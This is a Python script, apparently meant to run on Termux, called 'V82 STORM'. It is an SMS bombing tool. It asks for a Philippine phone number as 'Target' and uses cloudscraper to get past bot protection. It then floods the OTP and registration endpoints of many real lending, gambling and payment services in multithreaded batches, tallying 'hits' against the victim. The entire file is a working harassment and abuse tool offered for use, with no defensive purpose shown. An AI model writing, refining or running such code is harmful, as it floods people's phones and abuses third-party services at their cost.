import cloudscraper, time, random, sys, threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# COLORS
G, R, Y, B, W = '\033[92m', '\033[91m', '\033[93m', '\033[94m', '\033[0m'
stats_lock = threading.Lock()

stats = {
    "juan": 0, "honey": 0, "bill": 0, "pita": 0, "moca": 0, 
    "j365": 0, "gperya": 0, "buenas": 0, "mega": 0, "sulo": 0, 
    "s5": 0, "bayad": 0, "casino": 0, "desk": 0, "laki": 0, "king": 0
}

scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def update_stats(key):
    with stats_lock:
        stats[key] += 1

# --- PHASE 1: BURSTING ALL MANUALS ---
def fire_manuals(target):
    t_m = f"+63{target[1:]}"
    # Listahan ng mga may print log sa Phase 1
    try:
        # JuanHand
        if scraper.post('https://gateway.juanhand.com/phi/api/sendSms/sendVerifyCode', json={"mobile": target, "msgType": 0}, headers={'AGENCY': 'paipaidai'}, timeout=5).status_code <= 400:
            update_stats("juan"); print(f"[{get_time()}] {B}[MANUAL]{W} JuanHand  : {G}HIT!{W}")
        # HoneyLoan
        if scraper.post('https://api.honeyloan.ph/api/client/registration/step-one', json={"grant_type": "password", "phone": target, "is_rights_block_accepted": True}, headers={'ismobileapp': 'true'}, timeout=5).status_code <= 400:
            update_stats("honey"); print(f"[{get_time()}] {B}[MANUAL]{W} HoneyLoan  : {G}HIT!{W}")
        # PitaCash
        if scraper.post('https://api-sc.pitacash.ph/v1/registration/sms/send', json={"phone": t_m, "resend": False}, timeout=5).status_code <= 400:
            update_stats("pita"); print(f"[{get_time()}] {B}[MANUAL]{W} PitaCash   : {G}HIT!{W}")
        # MocaMoca
        if scraper.post('https://api.mocamocatech.com/ph/util/verify-code', json={"phone": target[1:], "sign": "cf123ece7be39f26f5f026100c2ea41a", "type": 1}, timeout=5).status_code <= 400:
            update_stats("moca"); print(f"[{get_time()}] {B}[MANUAL]{W} MocaMoca   : {G}HIT!{W}")
        # Gperya
        if scraper.post('https://game-srv-01.slllot.com/prod-api-2/app/v1/smsSendV2', json={"countryCode": 63, "mobile": target, "type": 3, "appId": "com.demo.web", "appWebName": "gperya"}, timeout=5).status_code <= 400:
            update_stats("gperya"); print(f"[{get_time()}] {B}[MANUAL]{W} Gperya     : {G}HIT!{W}")
        # Buenas
        if scraper.post('https://www.buenas.ph/wps/verification/sms/register', json={"mobileNo": target[1:], "countryDialingCode": "63"}, headers={'merchant': 'buenasf1'}, timeout=5).status_code <= 400:
            update_stats("buenas"); print(f"[{get_time()}] {B}[MANUAL]{W} Buenas.ph : {G}HIT!{W}")
    except: pass

# --- PHASE 2: UNLI SPEED (THE HEAVY HITTERS) ---
def fire_speed(target):
    t_m = f"+63{target[1:]}"
    # SPEED GROUP A (The 400+ Hits Club)
    try:
        scraper.post('https://services.megaperya.com/lobby/api/v1/auth/otp/generate', json={"mobile_number": target}, timeout=4)
        update_stats("mega")
        scraper.post('https://api-www.sulobet.ph/user/auth/register/sendcode', json={"account": target, "type": 1, "send_type": 1}, timeout=4)
        update_stats("sulo")
        scraper.post("https://api.s5.com/player/api/v1/otp/request", data={'phone_number': t_m}, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=4)
        update_stats("s5")
    except: pass

    # SPEED GROUP B (J365 & Casino Plus)
    try:
        # Juan365/J365
        scraper.post('https://juan365.com/api759/api/public/sendSms', json={"phone_number": target, "code_value": "999091"}, timeout=4)
        update_stats("j365")
        # Casino Plus (GRPC-Web)
        p_c = b'\x00\x00\x00\x00\x14\n\x0c63' + target[1:].encode() + b'\x12\x0250\x18\x01'
        scraper.post('https://fpms-nt.casinoplus.top/auth/auth.FrontendAuthService/PlayerRegisterRequestCode', data=p_c, headers={'content-type': 'application/grpc-web+proto'}, timeout=4)
        update_stats("casino")
    except: pass

    # SPEED GROUP C (Lakiwin, King, Desk, Bayad)
    try:
        scraper.post("https://api.online.bayad.com/api/sign-up/otp", json={"mobileNumber": t_m, "emailAddress": f"v82_{random.randint(10,99)}@gmail.com"}, timeout=4)
        update_stats("bayad")
        scraper.post('https://www.deskgame.com/api/sms/send_message', json={"phone":target[1:],"countryId":"PH"}, timeout=4)
        update_stats("desk")
        scraper.post('https://www.lakiwin.com/service/mobile/check', json={"phoneNumber":target, "otpType":"LOGIN_OTP"}, timeout=4)
        update_stats("laki")
        scraper.post('https://user.king.ph/api/sms/register/send', json={"mobile":target[1:],"mobile_country_code":"63"}, timeout=4)
        update_stats("king")
    except: pass

def main():
    while True:
        with stats_lock:
            for key in stats: stats[key] = 0
        print(f"\n{B}=========================================={W}")
        print(f"{G}      V82 STORM - ALL IN ONE FINAL        {W}")
        print(f"{B}=========================================={W}")
        target = input(f"{Y}[?]{W} Target: ").strip()
        if len(target) != 11: continue
        
        batches = int(input(f"{Y}[?]{W} Speed Batches: ") or 100)
        
        print(f"\n{B}[!] PHASE 1: BURSTING ALL MANUALS...{W}")
        fire_manuals(target)
        
        print(f"\n{R}[!] PHASE 2: LAUNCHING UNLI SPEED...{W}\n")
        with ThreadPoolExecutor(max_workers=40) as executor:
            for _ in range(batches):
                executor.submit(fire_speed, target)
                time.sleep(0.02) # Sagad na bilis para sa Termux

        print(f"\n{Y}=========================================={W}")
        print(f"{G}          STORM ATTACK SUMMARY           {W}")
        print(f"{Y}=========================================={W}")
        for k, v in stats.items():
            # Inayos ang order para match sa 6169.jpg
            print(f" {W}{k.upper():12}: {G}{v} {W}Hits")
        print(f"{Y}------------------------------------------{W}")
        print(f" {B}TOTAL IMPACTS: {sum(stats.values())}{W}")
        print(f"{Y}=========================================={W}")
        if input(f"\n{G}[!] DONE. {W}Ulit? (y/n): ").lower() == 'n': break

if __name__ == "__main__":
    main()
